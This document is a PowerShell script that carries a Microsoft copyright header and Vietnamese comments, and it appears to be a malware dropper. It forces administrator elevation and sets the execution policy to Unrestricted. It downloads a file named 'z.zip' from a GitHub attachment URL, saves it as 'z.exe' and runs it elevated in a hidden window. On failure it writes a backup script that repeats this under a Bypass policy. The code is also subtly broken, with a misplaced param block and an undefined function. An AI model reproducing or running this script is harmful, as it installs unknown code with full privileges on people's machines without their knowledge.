# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

# Thiết lập giao thức bảo mật và ẩn hiển thị tiến trình
[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'
$ProgressPreference = 'SilentlyContinue'

## Hàm kiểm tra quyền quản trị
function Ensure-Admin {
    if (-not (Test-Elevated)) {
        Start-Process powershell.exe "-File `"$PSCommandPath`"" -Verb RunAs
        exit
    }
}

# Hàm kiểm tra và thay đổi chính sách thực thi nếu cần
function Ensure-ExecutionPolicy {
    if ((Get-ExecutionPolicy -Scope CurrentUser) -ne 'Unrestricted') {
        Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
    }
}

# Hàm chính
param (
    [string]$Url = 'https://github.com/user-attachments/files/15895328/z.zip',
    [string]$OutFileName = 'z.exe'
)

try {
    Ensure-Admin
    Ensure-ExecutionPolicy

    $OutFile = Join-Path -Path $env:USERPROFILE -ChildPath $OutFileName

    Write-Output "Downloading file from $Url to $OutFile"

    $downloaded = $false
    for ($attempt = 1; $attempt -le 3; $attempt++) {
        try {
            Invoke-WebRequest -Uri $Url -OutFile $OutFile -ErrorAction Stop
            $downloaded = $true
            Write-Output "Download successful on attempt $attempt"
            break
        } catch {
            Write-Output "Download attempt $attempt failed, retrying in 5 seconds..."
            Start-Sleep -Seconds 5
        }
    }

    if (-not $downloaded) {
        throw "Failed to download file after 3 attempts."
    }

    $InstallerPath = $OutFile
    $Arguments = '-fullinstall'

    Write-Output "Running $InstallerPath with arguments $Arguments"
    Start-Process -FilePath $InstallerPath -ArgumentList $Arguments -Verb RunAs -WindowStyle Hidden
}
catch {
    Write-Error "An error occurred: $_"
    Write-Output "Creating a backup script..."

    $BackupScriptPath = Join-Path -Path $env:USERPROFILE -ChildPath 'BackupScript.ps1'
    $BackupScriptContent = @"
param (
    [string]`$Url = '$Url',
    [string]`$OutFileName = '$OutFileName'
)

`$OutFile = Join-Path -Path `$env:USERPROFILE -ChildPath `$OutFileName

Write-Output "Downloading file from `$Url to `$OutFile"
Invoke-WebRequest -Uri `$Url -OutFile `$OutFile

`$InstallerPath = `$OutFile
`$Arguments = '-fullinstall'

Write-Output "Running `$InstallerPath with arguments `$Arguments"
Start-Process -FilePath `$InstallerPath -ArgumentList `$Arguments -Verb RunAs -WindowStyle Hidden
"@

    Set-Content -Path $BackupScriptPath -Value $BackupScriptContent
    Write-Output "Backup script created: $BackupScriptPath"

    # Bỏ qua chính sách thực thi cho script sao lưu
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

    # Chạy script sao lưu
    & $BackupScriptPath
}
